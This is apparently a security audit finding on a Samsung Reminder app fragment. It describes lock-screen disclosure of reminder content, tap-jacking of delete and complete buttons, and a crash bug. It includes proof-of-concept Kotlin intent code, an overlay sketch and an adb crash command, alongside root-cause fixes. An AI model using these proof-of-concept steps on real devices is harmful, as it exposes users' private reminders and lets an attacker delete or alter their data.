## [V-005] i9.T (WidgetDetailCoverFragment) â€” Lock-Screen Reminder Disclosure + Tap-Jacking-Ready Destructive Controls

**File:** `sources/i9/T.java`
**Severity:** Critical (confidentiality + integrity, no authentication/permission required)
**Class of flaw:** CWE-200 (info disclosure) + CWE-862 (missing authorization) + CWE-1021 (UI redress / clickjacking) + CWE-523 (unprotected transport of sensitive data across UI).

### Summary
`i9.T` is the fragment that `WidgetDetailCoverActivity` inflates with the attacker-supplied `uuid` extra. Two independent issues compound V-004 into a critical bug:

**(a) Unconditional lock-screen bypass.** In `onCreateView` (lines 115â€“118):
```java
AbstractActivityC1846c0 act = requireActivity();
act.getWindow().addFlags(1);                // FLAG_KEEP_SCREEN_ON
act.setShowWhenLocked(true);                // force display over keyguard
act.setTurnScreenOn(true);                  // wake screen on resume
```
These flags are set **unconditionally on every launch**, including when the caller is an attacker app going through the exported `content://com.samsung.android.app.reminder/viewcoverdetail?uuid=â€¦` deeplink (V-004). As a result the reminder detail is rendered over the lock screen â€” leaking the reminder body (title, notes, attachments metadata, time, location) to anyone who can trigger the intent, regardless of whether the device is locked.

**(b) Destructive operations directly exposed on the cover UI.** `onViewCreated` wires attacker-reachable click-listeners to three buttons on the cover fragment that operate on the attacker-chosen reminder:

| Button field | Listener action |
|---|---|
| `f37070x` (complete FAB) | `RepositoryHolder.INSTANCE.getReminderRepository().c(f37065r)` â€” marks the reminder **complete** |
| `f37072z` (delete icon) | `RepositoryHolder.INSTANCE.getReminderRepository().i(f37065r, â€¦)` â€” **deletes** the reminder |
| `f37071y` (restore FAB) | `new B2(this, 2)` â€” restore-from-trash click handler |

Because:
* the cover activity is shown over a locked screen,
* the cover fragment displays the victim's reminder content,
* the `uuid` used to populate `f37065r` is 100% attacker-controlled,

â€¦an attacker can use a well-timed second malicious overlay (toast, system alert window, accessibility tap, or physical proximity to the cover display) to **clickjack the Delete / Complete button** while the victim's reminder is targeted â€” destroying arbitrary reminders by UUID without unlocking the phone or holding any permission.

**(c) Reliable null-deref DoS.** Line 175 (`kotlin.jvm.internal.m.e(string)`) crashes the hosting process if no `"uuid"` extra is provided and the path segment isn't `viewcoverdetail` (see V-004 DoS variant); line 87 does the same if `getContext()` and `getBaseContext()` both return null during early boot.

### Attacker capability matrix
| Capability | Pre-reqs | Result |
|---|---|---|
| **Read** any reminder's body | a guessed/leaked UUID + any unprivileged app (or simulated adb) | Reminder text surfaced on-screen (optionally over keyguard) |
| **Delete** any reminder | above + a UI redress / tap-inject / coincident screen tap | Reminder removed from DB via `repository.i(reminder, â€¦)` |
| **Complete** any reminder | above + one tap on the complete FAB | Reminder marked complete via `repository.c(reminder)` |
| **Burn-screen / battery DoS** | ability to spam the intent | `KEEP_SCREEN_ON + setTurnScreenOn` awakens and pins the display |
| **Crash the app** | send intent with empty path + no `uuid` extra | NPE in `kotlin.jvm.internal.m.e` |

### Proof-of-Concept

**Disclosure (renders any reminder on the locked cover screen):**
```kotlin
val victim = "11111111-2222-3333-4444-555555555555"
startActivity(Intent(Intent.ACTION_VIEW).apply {
    setClassName(
        "com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.list.widget.WidgetDetailCoverActivity"
    )
    data = Uri.parse(
        "content://com.samsung.android.app.reminder/viewcoverdetail?uuid=$victim"
    )
    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY)
})
// Device wakes up, screen turns on, reminder body is drawn above the keyguard.
```

**Clickjack (delete arbitrary reminder without unlock):** combine above with a SYSTEM_ALERT_WINDOW overlay whose cut-out aligns with `R.id.delete_icon`, or dispatch accessibility click events from a rogue accessibility service. Minimal overlay sketch:
```kotlin
val params = WindowManager.LayoutParams(
    WindowManager.LayoutParams.MATCH_PARENT,
    WindowManager.LayoutParams.MATCH_PARENT,
    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, PixelFormat.TRANSLUCENT)
// Fake 'swipe to unlock' strip aligned over the delete_icon button position.
```
The keyguard is behaviourally bypassed for Reminder because the target activity itself sets `setShowWhenLocked(true)` for us.

**DoS:**
```
adb shell am start -a android.intent.action.VIEW \
  -d "content://com.samsung.android.app.reminder/" \
  -n com.samsung.android.app.reminder/.ui.list.widget.WidgetDetailCoverActivity
```
â†’ no `uuid`, path segment â‰  `viewcoverdetail` â†’ `string` null â†’ `m.e(null)` â†’ `IllegalStateException`.

### Root-cause fixes
1. Only call `setShowWhenLocked(true) / setTurnScreenOn(true)` when the activity was launched by the trusted system cover-widget provider (verify caller UID / component). Guard with a `KeyguardManager` check, and require user authentication (`KeyguardManager.createConfirmDeviceCredentialIntent`) before revealing reminder content on keyguard.
2. Do **not** perform any destructive repository operation (`repository.c`, `repository.i`) from a fragment launched via an attacker-addressable intent path without a prior authentication prompt.
3. Replace the two `kotlin.jvm.internal.m.e(...)` checkNotNull calls with a graceful `finish()` fallback.

